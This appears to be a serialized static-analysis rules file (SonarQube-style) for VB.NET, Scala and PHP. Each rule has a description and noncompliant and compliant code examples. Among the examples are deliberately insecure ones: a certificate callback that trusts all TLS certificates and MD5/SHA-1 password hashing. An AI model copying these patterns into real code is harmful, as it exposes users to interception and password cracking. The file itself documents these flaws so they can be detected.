<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements, but if you cannot, then consider moving
the inner <code>switch</code> to another function.</p>Z
CODE_SMELL
∞
vbnet:S3449†
vbnetS34494Right operands of shift operators should be integers"CRITICAL*vbnet:√<p>Numbers can be shifted with the <code>&lt;&lt;</code> and <code>&gt;&gt;</code> operators, but the right operand of the operation needs to be an
<code>int</code> or a type that has an implicit conversion to <code>int</code>. However, with <code>dynamic</code>, the compiler's type checking is
turned off, so you can pass anything to a shift operator and have it compile. And if the argument can't be converted to <code>int</code> at runtime,
then a <code>RuntimeBinderException</code> will be raised.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim o As Object = 5
Dim x As Integer = 5

x = o &gt;&gt; 5 ' Noncompliant
x = x &gt;&gt; o ' Noncompliant
</pre>
<h2>Exceptions</h2>
<p>This rule does not raise when the left or the right expression is <code>Nothing</code>.</p>
<pre>
x = Nothing &gt;&gt; 5
x = 5 &gt;&gt; Nothing
</pre>ZBUG
¨
vbnet:S3776ú
vbnetS37768Cognitive Complexity of functions should not be too high"CRITICAL*vbnet:¥<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>Z
CODE_SMELL
ñ
vbnet:S4586Ü
vbnetS45867Non-async "Task/Task<T>" methods should not return null"CRITICAL*vbnet:¶<p>Returning <code>Nothing</code> from a non-<code>async</code> <code>Task</code>/<code>Task(Of T)</code> method will cause a
<code>NullReferenceException</code> at runtime. This problem can be avoided by returning <code>Task.FromResult(Of T)(Nothing)</code> instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Function GetFooAsync() As Task(Of Object)
    Return Nothing
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Function GetFooAsync() As Task(Of Object)
    Return Task.FromResult(Of Object)(Nothing)
End Function
</pre>ZBUG
µ
vbnet:S1645•
vbnetS16456The "&" operator should be used to concatenate strings"CRITICAL*vbnet:ø<p>Consistently using the <code>&amp;</code> operator for string concatenation make the developer intentions clear.</p>
<p><code>&amp;</code>, unlike <code>+</code>, will convert its operands to strings and perform an actual concatenation.</p>
<p><code>+</code> on the other hand can be an addition, or a concatenation, depending on the operand types.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Console.WriteLine("1" + 2) ' Noncompliant - will display "3"
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Console.WriteLine(1 &amp; 2)   ' Compliant - will display "12"
        Console.WriteLine(1 + 2)   ' Compliant - but will display "3"
        Console.WriteLine("1" &amp; 2) ' Compliant - will display "12"
    End Sub
End Module
</pre>Z
CODE_SMELL
∞

vbnet:S2339†

vbnetS2339*Public constant members should not be used"CRITICAL*vbnet:∆	<p>Constant members are copied at compile time to the call sites, instead of being fetched at runtime.</p>
<p>As an example, say you have a library with a constant <code>Version</code> member set to <code>1.0</code>, and a client application linked to it.
This library is then updated and <code>Version</code> is set to <code>2.0</code>. Unfortunately, even after the old DLL is replaced by the new one,
<code>Version</code> will still be <code>1.0</code> for the client application. In order to see <code>2.0</code>, the client application would need to
be rebuilt against the new version of the library.</p>
<p>This means that you should use constants to hold values that by definition will never change, such as <code>Zero</code>. In practice, those cases
are uncommon, and therefore it is generally better to avoid constant members.</p>
<p>This rule only reports issues on public constant fields, which can be reached from outside the defining assembly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Class Foo
    Public Const Version = 1.0           ' Noncompliant
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Class Foo
    Public Shared ReadOnly Property Version = 1.0 ' Compliant
End Class
</pre>Z
CODE_SMELL
˙

vbnet:S2302Í

vbnetS2302"NameOf" should be used"CRITICAL*vbnet:£
<p>Because parameter names could be changed during refactoring, they should not be spelled out literally in strings. Instead, use
<code>NameOf()</code>, and the string that's output will always be correct.</p>
<p>This rule raises an issue when any string in the <code>Throw</code> statement is an exact match for the name of one of the method parameters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub DoSomething(param As Integer, secondParam As String)
    If (param &lt; 0)
        Throw New Exception("param") ' Noncompliant
    End If
    If secondParam is Nothing
      Throw New Exception("secondParam should be valid") ' Noncompliant
    End If
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub DoSomething(param As Integer, secondParam As String)
    If (param &lt; 0)
        Throw New Exception(NameOf(param))
    End If
    If secondParam is Nothing
      Throw New Exception($"{NameOf(secondParam)} should be valid")
    End If
End Sub
</pre>
<h2>Exceptions</h2>
<ul>
  <li> The rule doesn't raise any issue when using VB.NET &lt; 14.0. </li>
  <li> When the parameter name is contained in a sentence inside the <code>Throw</code> statement string, the rule will raise an issue only if the
  parameter name is at least 5 characters long. This is to avoid false positives. </li>
</ul>Z
CODE_SMELL
î
vbnet:S1067Ñ
vbnetS1067%Expressions should not be too complex"CRITICAL*vbnet:Ø<p>Complex boolean expressions are hard to read and so to maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3</p>
<pre>
If ((condition1 AndAlso condition2) OrElse (condition3 AndAlso condition4)) AndAlso condition5) Then  'Noncompliant
  ...
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If ((MyFirstCondition() OrElse MySecondCondition()) AndAlso MyLastCondition()) Then
  ...
End If
</pre>Z
CODE_SMELL
ú	
vbnet:S2551å	
vbnetS2551/Shared resources should not be used for locking"CRITICAL*vbnet:¥<p>Shared resources should not be used for locking as it increases the chance of deadlocks. Any other thread could acquire (or attempt to acquire) the
same lock for another unrelated purpose. </p>
<p>Instead, a dedicated <code>object</code> instance should be used for each shared resource, to avoid deadlocks or lock contention.</p>
<p>The following objects are considered as shared resources:</p>
<ul>
  <li> <code>Me</code> </li>
  <li> a <code>Type</code> object </li>
  <li> a string literal </li>
  <li> a string instance </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Public Sub MyLockingMethod()
    SyncLock Me 'Noncompliant
        ' ...
    End SyncLock
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Class MyClass
    Dim lockObj As New Object()

    Public Sub MyLockingMethod()
        SyncLock lockObj
            ' ...
        End SyncLock
    End Sub
End Class
</pre>
<h2>See</h2>
<p><a href="https://docs.microsoft.com/en-us/dotnet/standard/threading/managed-threading-best-practices">Microsoft Documentation: Managed Threading
Best Practices</a></p>ZBUG
∑
vbnet:S1186ß
vbnetS1186Methods should not be empty"CRITICAL*vbnet:‹<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed. </li>
  <li> It is not yet, or never will be, supported. In this case a <code>NotSupportedException</code> should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Sub DoSomething()
End Sub

Function DoSomething()
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Sub DoSomething()
    ' Not implemented because of reason
End Sub

Function DoSomething()
    Throw New NotSupportedException
End Function
</pre>
<h2>Exceptions</h2>
<p>The following methods are ignored:</p>
<ul>
  <li> empty <code>Overridable</code> or <code>MustOverride</code> methods, </li>
  <li> empty methods that override an <code>MustOverride</code> method, </li>
  <li> empty overrides in test assemblies. </li>
</ul>Z
CODE_SMELL
¬

vbnet:S131≥
vbnetS1318"Select" statements should end with a "Case Else" clause"CRITICAL*vbnet:Ã<p>The requirement for a final <code>Case Else</code> clause is defensive programming.</p>
<p>This clause should either take appropriate action or contain a suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Select Case param ' Noncompliant - Case Else clause is missing
  Case 0
    DoSomething()
  Case 1
    DoSomethingElse()
End Select
</pre>
<h2>Compliant Solution</h2>
<pre>
Select Case param
  Case 0
    DoSomething()
  Case 1
    DoSomethingElse()
  Case Else ' Compliant
    DoSomethingElse()
End Select
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
·
vbnet:S2365—
vbnetS23655Properties should not make collection or array copies"CRITICAL*vbnet:Ï<p>Most developers expect property access to be as efficient as field access. However, if a property returns a copy of an array or collection, it will
be much slower than a simple field access, contrary to the caller's likely expectations. Therefore, such properties should be refactored into methods
so that callers are not surprised by unexpectedly poor performance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    ' Internal state
    Dim array = {"apple", "banana", "orange", "pineapple", "strawberry"}

    ReadOnly Property Foo() As String() ' Noncompliant
        Get
            Dim copy = array.Clone      ' Expensive call
            Return copy
        End Get
    End Property
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    ' Internal state
    Dim array = {"apple", "banana", "orange", "pineapple", "strawberry"}

    Function GetFoo() As String()       ' Compliant
        Dim copy = array.Clone
        Return copy
    End Function
End Module
</pre>Z
CODE_SMELL
√

vbnet:S134¥
vbnetS134rControl flow statements "If", "For", "For Each", "Do", "While", "Select" and "Try" should not be nested too deeply"CRITICAL*vbnet:ì<p>Nested <code>If</code>, <code>Select</code>, <code>For</code>, <code>For Each</code>, <code>While</code>, <code>Do</code>, and <code>Try</code>
statements are key ingredients for making what's known as "Spaghetti code".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
If condition1 ' Compliant - depth = 1
  ' ...
  If condition2 ' Compliant - depth = 2
    ' ...
    For i = 0 to 10 ' Compliant - depth = 3, not exceeding the limit
      ' ...
      If condition4 ' Noncompliant - depth = 4
        If condition5 ' Depth = 5, exceeding the limit, but issues are only reported on depth = 4
          ' ...
        End If
        Return
      End If
    Next
  End If
End If
</pre>Z
CODE_SMELL
œ
vbnet:S2360ø
vbnetS2360&Optional parameters should not be used"CRITICAL*vbnet:È
<p>The overloading mechanism should be used in place of optional parameters for several reasons:</p>
<ul>
  <li> Optional parameter values are baked into the method call site code, thus, if a default value has been changed, all referencing assemblies need
  to be rebuilt, otherwise the original values will be used. </li>
  <li> The Common Language Specification (CLS) allows compilers to ignore default parameter values, and thus require the caller to explicitly specify
  the values. For example, if you want to consume a method with default argument from another .NET compatible language (for instance C++/CLI), you
  will have to provide all arguments. When using method overloads, you could achieve similar behavior as default arguments. </li>
  <li> Optional parameters prevent muddying the definition of the function contract. Here is a simple example: if there are two optional parameters,
  when one is defined, is the second one still optional or mandatory? </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Sub Notify(ByVal Company As String, Optional ByVal Office As String = "QJZ") ' Noncompliant

End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Sub Notify(ByVal Company As String)
  Notify(Company, "QJZ")
End Sub

Sub Notify(ByVal Company As String, ByVal Office As String)

End Sub
</pre>
<h2>Exceptions</h2>
<p>The rule ignores non externally visible methods.</p>Z
CODE_SMELL
Å


vbnet:S126Ú	
vbnetS1269"If ... ElseIf" constructs should end with "Else" clauses"CRITICAL*vbnet:ä	<p>This rule applies whenever an <code>If</code> statement is followed by one or more <code>ElseIf</code> statements; the final <code>ElseIf</code>
should be followed by an <code>Else</code> statement.</p>
<p>The requirement for a final <code>Else</code> statement is defensive programming.</p>
<p>The <code>Else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>Case Else</code> clause in a <code>Select Case</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If x = 0 Then
    DoSomething()
ElseIf x = 1 Then
    DoSomethingElse()
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If x = 0 Then
    DoSomething()
ElseIf x = 1 Then
    DoSomethingElse()
Else
    Throw New ArgumentException("...")
End If
</pre>
<h2>Exceptions</h2>
<p>None</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
ö
vbnet:S4830ä
vbnetS4830AServer certificates should be verified during SSL/TLS connections"CRITICAL*vbnet:ñ<p>Validation of X.509 certificates is essential to create secure SSL/TLS sessions not vulnerable to man-in-the-middle attacks. </p>
<p>The certificate chain validation includes these steps:</p>
<ul>
  <li> The certificate is issued by its parent Certificate Authority or the root CA trusted by the system. </li>
  <li> Each CA is allowed to issue certificates. </li>
  <li> Each certificate in the chain is not expired. </li>
</ul>
<p>It's not recommended to reinvent the wheel by implementing custom certificate chain validation.</p>
<p>TLS libraries provide built-in certificate validation functions that should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
ServicePointManager.ServerCertificateValidationCallback =
    Function(sender, certificate, chain, errors) True ' Noncompliant: trust all certificates

</pre>
<h2>Compliant Solution</h2>
<pre>
ServicePointManager.ServerCertificateValidationCallback =
    Function(sender, certificate, chain, errors)
        If Development Then Return True ' For development, trust all certificates
        Return Errors = SslPolicyErrors.None AndAlso ValidCerts.Contains(certificate.GetCertHashString()) ' Compliant: trust only some certificates
    End Function
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/295.html">MITRE, CWE-295</a> - Improper Certificate Validation </li>
</ul>ZVULNERABILITY
∫	
vbnet:S4277™	
vbnetS4277/"Shared" parts should not be created with "new""CRITICAL*vbnet:“<p>Marking a class with <code>PartCreationPolicy(CreationPolicy.Shared)</code>, which is part of Managed Extensibility Framework (MEF), means that a
single, shared instance of the exported object will be created. Therefore it doesn't make sense to create new instances using the constructor and it
will most likely result in unexpected behaviours.</p>
<p>This rule raises an issue when a constructor of a class marked shared with a <code>PartCreationPolicyAttribute</code> is invoked.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Export(GetType(IFooBar))&gt;
&lt;PartCreationPolicy(CreationPolicy.[Shared])&gt;
Public Class FooBar
    Inherits IFooBar
End Class

Public Class Program
    Public Shared Sub Main()
        Dim fooBar = New FooBar() ' Noncompliant
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Export(GetType(IFooBar))&gt;
&lt;PartCreationPolicy(CreationPolicy.[Shared])&gt;
Public Class FooBar
    Inherits IFooBar
End Class

Public Class Program
    Public Shared Sub Main()
        Dim fooBar = serviceProvider.GetService(Of IFooBar)()
    End Sub
End Class
</pre>ZBUG
º
vbnet:S2374¨
vbnetS23741Signed types should be preferred to unsigned ones"CRITICAL*vbnet:À<p>Unsigned integers have different arithmetic operators than signed ones - operators that few developers understand. Therefore, signed types should
be preferred where possible.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo1 As UShort   ' Noncompliant
        Dim foo2 As UInteger ' Noncompliant
        Dim foo3 As ULong    ' Noncompliant
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        Dim foo1 As Short
        Dim foo2 As Integer
        Dim foo3 As Long
    End Sub
End Module
</pre>Z
CODE_SMELL
ê

vbnet:S3866Ä

vbnetS3866"IIf" should not be used"CRITICAL*vbnet:∏	<p>Visual Basic .NET offers a non-short-circuit conditional function, <code>IIf()</code>, which returns either its second or third parameter based on
the expression in the first parameter. Using it is slower than using <code>If()</code> because each parameter is unconditionally evaluated. Further,
its use can lead to runtime exceptions because <code>IIf</code> always evaluates all three of its arguments. </p>
<p>The newer version, <code>If()</code>, should be used instead because it short-circuits the evaluation of its parameters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Class Foo
    Public Sub Bar()
        Dim var As Object = IIf(Date.Now.Year = 1999, "Lets party!", "Lets party like it is 1999!") ' Noncompliant
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Class Foo
    Public Sub Bar()
        Dim var As String = If(Date.Now.Year = 1999, "Lets party!", "Lets party like it is 1999!")
    End Sub
End Class
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://msdn.microsoft.com/en-us/library/27ydhh0d(v=vs.90).aspx">IIf Function (MSDN)</a> </li>
  <li> <a href="https://msdn.microsoft.com/en-us/library/bb513985(v=vs.90).aspx">If Operator (MSDN)</a> </li>
</ul>Z
CODE_SMELL
Ω
vbnet:S4275≠
vbnetS42755Getters and setters should access the expected fields"CRITICAL*vbnet:œ<p>Properties provide a way to enforce encapsulation by providing <code>public</code>, <code>protected</code> or <code>internal</code> methods that
give controlled access to <code>private</code> fields. However in classes with multiple fields it is not unusual that cut and paste is used to quickly
create the needed properties, which can result in the wrong field being accessed by a getter or setter.</p>
<p>This rule raises an issue in any of these cases:</p>
<ul>
  <li> A setter does not update the field with the corresponding name. </li>
  <li> A getter does not access the field with the corresponding name. </li>
</ul>
<p>For simple properties it is better to use <a
href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/classes-and-structs/auto-implemented-properties">auto-implemented
properties</a> (C# 3.0 or later).</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class A
    Private x As Integer
    Private y As Integer

    Public Property X As Integer
        Get
            Return x
        End Get
        Set(ByVal value As Integer)
            x = value
        End Set
    End Property

    Public Property Y As Integer
        Get  ' Noncompliant: field 'y' is not used in the return value
            Return x
        End Get
        Set(ByVal value As Integer) ' Noncompliant: field 'y' is not updated
            x = value
        End Set
    End Property
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class A
    Private x As Integer
    Private y As Integer

    Public Property X As Integer
        Get
            Return x
        End Get
        Set(ByVal value As Integer)
            x = value
        End Set
    End Property

    Public Property Y As Integer
        Get
            Return y
        End Get
        Set(ByVal value As Integer)
            y = value
        End Set
    End Property
End Class
</pre>ZBUG
´
scala:S3776õ
scalaS37768Cognitive Complexity of functions should not be too high"CRITICAL*scala:≥<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>Z
CODE_SMELL
ô

scala:S134ä
scalaS134_Control flow statements "if", "for", "while", "match" and "try" should not be nested too deeply"CRITICAL*scala:¸<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>match</code>, and <code>try</code> statements are key ingredients for making
what's known as "Spaghetti code".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>Z
CODE_SMELL
€
scala:S1192À
scalaS1192(String literals should not be duplicated"CRITICAL*scala:Û<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 5 characters are excluded.</p>Z
CODE_SMELL
˜

scala:S126Ë
scalaS126:"if ... else if" constructs should end with "else" clauses"CRITICAL*scala:ˇ
<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>case _</code> clause in a <code>match</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0) {
  doSomething
} else if (x == 1) {
  doSomethingElse
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x == 0) {
  doSomething
} else if (x == 1) {
  doSomethingElse
} else {
  throw new IllegalStateException
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
ç
scala:S1067˝
scalaS1067%Expressions should not be too complex"CRITICAL*scala:®<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code> and <code>||</code> operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3:</p>
<pre>
if (((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5) { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if ((myFirstCondition || mySecondCondition) &amp;&amp; myLastCondition) { ... }
</pre>Z
CODE_SMELL
í
scala:S1186Ç
scalaS1186Methods should not be empty"CRITICAL*scala:∑<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an exception should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>Z
CODE_SMELL
«
scala:S1821∑
scalaS1821'"match" statements should not be nested"CRITICAL*scala:‡<p>Nested <code>match</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>match</code> as
belonging to an outer statement. Therefore nested <code>match</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>match</code> statements, but if you cannot, then consider moving
the inner <code>match</code> to another function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def foo(n: Int, m: Int): Unit = {
  n match {
    case 0 =&gt; m match {
        case 0 =&gt;
        // ...
      }
    case 1 =&gt;
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
def foo(n: Int, m: Int): Unit = {
  n match {
    case 0 =&gt; bar(m)
    case 1 =&gt;
    // ...
  }
}

def bar(m: Int): Unit = {
  m match {
    case 0 =&gt;
    // ...
  }
}
</pre>Z
CODE_SMELL
ò
	php:S4524ä
phpS4524)"default" clauses should be first or last"CRITICAL*php:µ<p><code>switch</code> can contain a <code>default</code> clause for various reasons: to handle unexpected values, to show that all the cases were
properly considered.</p>
<p>For readability purpose, to help a developer to quickly find the default behavior of a <code>switch</code> statement, it is recommended to put the
<code>default</code> clause at the end of the <code>switch</code> statement. This rule raises an issue if the <code>default</code> clause is not the
first or the last one of the <code>switch</code>'s cases.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch ($param) {
  case 0:
    doSomething();
    break;
  default: // default clause should be the first or last one
    error();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch ($param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>Z
CODE_SMELL
Ñ
php:S121˜
phpS121*Control structures should use curly braces"CRITICAL*php:¢<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
  executeSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  executeSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1QGMAg">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/3wHEAw">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>Z
CODE_SMELL
˙
	php:S1541Ï
phpS1541#Functions should not be too complex"CRITICAL*php:ù<p>The Cyclomatic Complexity of functions should not exceed a defined threshold. Complex code may perform poorly and can be difficult to test
thoroughly.</p>Z
CODE_SMELL
µ
php:S115®
phpS1155Constant names should comply with a naming convention"CRITICAL*php:»<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that all constant names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$</code>:</p>
<pre>
define("const1", true);

class Foo {
    const const2 = "bar";
}
</pre>
<h2>Compliant Solution</h2>
<pre>
define("CONST1", true);

class Foo {
    const CONST2 = "bar";
}
</pre>Z
CODE_SMELL
Ï
	php:S2070ﬁ
phpS2070NSHA-1 and Message-Digest hash algorithms should not be used in secure contexts"CRITICAL*php:·<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>Consider using safer alternatives, such as SHA-256, or SHA-3.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$password = ...

if (md5($password) === '1f3870be274f6c49b3e31a0c6728957f') { // Noncompliant; md5() hashing algorithm is not secure for password management
   [...]
}

if (sha1($password) === 'd0be2dc421be4fcd0172e5afceea3970e2f3d940') { // Noncompliant; sha1() hashing algorithm is not secure for password management
   [...]
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/328">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="http://shattered.io/">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=php%3AS4790'>S4790</a> instead.</p>ZVULNERABILITY
¶
	php:S3776ò
phpS37768Cognitive Complexity of functions should not be too high"CRITICAL*php:¥<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>Z
CODE_SMELL
ˇ
	php:S1998Ò
phpS19981References should not be passed to function calls"CRITICAL*php:î<p>Passing a reference to a function parameter means that any modifications the method makes to the parameter will be made to the original value as
well, since references have the effect of pointing two variables at the same memory space. This feature can be difficult to use correctly,
particularly if the callee is not expecting a reference, and the improper use of references in function calls can make code less efficient rather than
more efficient. </p>
<p>Further, according to the PHP manual: </p>
<blockquote>
  As of PHP 5.3.0, you will get a warning saying that "call-time pass-by-reference" is deprecated... And as of PHP 5.4.0, call-time pass-by-reference
  was removed, so using it will raise a fatal error.
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
myfun(&amp;$name);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
myfun($name);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/374">MITRE, CWE-374</a> - Weakness Base Passing Mutable Objects to an Untrusted Method </li>
</ul>Z
CODE_SMELL
ö
	php:S2041å
phpS20412Parentheses should not be used for calls to "echo""CRITICAL*php:Æ<p><code>echo</code> can be called with or without parentheses, but it is best practice to leave parentheses off the call because using parentheses
with multiple arguments will result in a parse error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
echo("Hello");  // Noncompliant, but it works
echo("Hello", "World"); // Noncompliant. Parse error
</pre>
<h2>Compliant Solution</h2>
<pre>
echo "Hello";
echo "Hello","World!";
</pre>Z
CODE_SMELL
‰
	php:S1192÷
phpS1192(String literals should not be duplicated"CRITICAL*php:Ç<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
function run() {
  prepare('action1');                              // Non-Compliant - 'action1' is duplicated 3 times
  execute('action1');
  release('action1');
}
</pre>
<h2>Compliant Solution</h2>
<pre>
ACTION_1 = 'action1';

function run() {
  prepare(ACTION_1);
  execute(ACTION_1);
  release(ACTION_1);
}
</pre>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 5 characters are excluded.</p>Z
CODE_SMELL
å
	php:S2053˛
phpS2053+Hashes should include an unpredictable salt"CRITICAL*php:§<p>In cryptography, "salt" is extra piece of data which is included in a hashing algorithm. It makes dictionary attacks more difficult. Using a
cryptographic hash function without an unpredictable salt increases the likelihood that an attacker will be able to successfully guess a hashed value
such as a password with a dictionary attack.</p>
<p>This rule raises an issue when a hashing function which has been specifically designed for hashing sensitive data, such as pbkdf2, is used with a
non-random, reused or too short salt value. It does not raise an issue on base hashing algorithms such as sha1 or md5 as these are often used for
other purposes.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> use hashing functions generating their own salt or generate a long random salt of at least 32 bytes. </li>
  <li> the salt is at least as long as the resulting hash value. </li>
